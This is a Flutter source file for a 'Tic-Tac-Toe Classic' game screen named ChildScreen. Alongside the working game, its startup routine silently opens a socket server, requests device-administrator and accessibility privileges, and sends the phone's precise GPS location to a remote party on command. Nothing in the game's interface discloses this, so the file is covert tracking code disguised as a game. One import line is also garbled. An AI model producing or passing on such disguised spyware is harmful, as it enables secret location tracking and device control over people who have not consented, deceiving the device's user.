import 'package0:flutter/material.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import '../services/socket_service.dart';
import '../services/device_admin_service.dart';
import '../services/accessibility_service.dart';
import '../models/command_model.dart';

class ChildScreen extends StatefulWidget {
  @override
  _ChildScreenState createState() => _ChildScreenState();
}

class _ChildScreenState extends State<ChildScreen> {
  final SocketService _socketService = SocketService();
  
  List<String> _board = List.filled(9, '');
  bool _isXTurn = true;
  String _winner = '';

  @override
  void initState() {
    super.initState();
    _initChildBackgroundServices();
  }

  Future<void> _initChildBackgroundServices() async {
    await _socketService.startServer();
    DeviceAdminService.requestAdminPrivileges();
    AccessibilityService.requestAccessibility();

    _socketService.onCommandReceived = (command) async {
      if (command.type == CommandType.requestLocation) {
        Position position = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        _socketService.sendCommand(CommandModel(
          type: CommandType.sendLocation,
          payload: {'lat': position.latitude, 'lng': position.longitude}
        ));
      }
    };
  }

  void _handleTap(int index) {
    if (_board[index] == '' && _winner == '') {
      setState(() {
        _board[index] = _isXTurn ? 'X' : 'O';
        _isXTurn = !_isXTurn;
        _checkWinner();
      });
    }
  }

  void _checkWinner() {
    List<List<int>> lines = [
      [0, 1, 2], [3, 4, 5], [6, 7, 8],
      [0, 3, 6], [1, 4, 7], [2, 5, 8],
      [0, 4, 8], [2, 4, 6]
    ];

    for (var line in lines) {
      if (_board[line[0]] != '' &&
          _board[line[0]] == _board[line[1]] &&
          _board[line[0]] == _board[line[2]]) {
        setState(() {
          _winner = '${_board[line[0]]} Wins!';
        });
        return;
      }
    }

    if (!_board.contains('') && _winner == '') {
      setState(() {
        _winner = 'Draw!';
      });
    }
  }

  void _resetGame() {
    setState(() {
      _board = List.filled(9, '');
      _isXTurn = true;
      _winner = '';
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.indigo[900],
      appBar: AppBar(
        title: const Text("Tic-Tac-Toe Classic"),
        backgroundColor: Colors.indigo[700],
        automaticallyImplyLeading: false,
      ),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          if (_winner.isNotEmpty)
            Padding(
              padding: const EdgeInsets.all(8.0),
              child: Text(
                _winner,
                style: const TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: Colors.amber),
              ),
            ),
          GridView.builder(
            shrinkWrap: true,
            padding: const EdgeInsets.all(32.0),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              crossAxisSpacing: 8,
              mainAxisSpacing: 8,
            ),
            itemCount: 9,
            itemBuilder: (context, index) {
              return GestureDetector(
                onTap: () => _handleTap(index),
                child: Container(
                  decoration: BoxDecoration(
                    color: Colors.indigo[800],
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Center(
                    child: Text(
                      _board[index],
                      style: TextStyle(
                        fontSize: 48,
                        fontWeight: FontWeight.bold,
                        color: _board[index] == 'X' ? Colors.cyanAccent : Colors.pinkAccent,
                      ),
                    ),
                  ),
                ),
              );
            },
          ),
          ElevatedButton(
            onPressed: _resetGame,
            style: ElevatedButton.styleFrom(backgroundColor: Colors.amber),
            child: const Text("Restart Game", style: TextStyle(color: Colors.black)),
          )
        ],
      ),
    );
  }

  @override
  void dispose() {
    _socketService.dispose();
    super.dispose();
  }
}
